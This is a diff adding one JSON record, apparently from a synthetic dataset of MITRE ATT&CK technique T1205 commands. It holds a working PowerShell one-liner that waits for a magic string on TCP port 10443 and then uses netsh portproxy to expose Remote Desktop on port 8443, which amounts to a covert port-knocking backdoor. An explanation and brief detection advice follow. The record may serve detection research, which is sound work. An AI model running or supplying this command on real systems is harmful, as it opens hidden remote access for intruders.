@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;$listener=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,10443);$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();$buf=New-Object byte[] 128;$n=$stream.Read($buf,0,$buf.Length);$msg=[Text.Encoding]::ASCII.GetString($buf,0,$n).Trim();if($msg -eq 'OPEN-SESAME'){& netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectaddress=127.0.0.1 connectport=3389};$client.Close();$listener.Stop()",
+  "explanation": "Awaits a TCP connection on 10443 and checks for the magic string 'OPEN-SESAME'. If present, it uses netsh to expose RDP via an HTTPS-looking port (8443) using portproxy to 127.0.0.1:3389. Requires elevation for portproxy.",
+  "rationale_steps": [
+    "Create a TCP listener on a non-standard port to receive a magic application-layer signal.",
+    "Upon receiving 'OPEN-SESAME', configure a netsh portproxy to forward 8443 to local RDP.",
+    "Detection: monitor netsh.exe portproxy invocations, changes to PortProxy registry keys, and anomalous listeners or sudden exposure of 8443 on hosts not running HTTPS."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-547fb38c",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
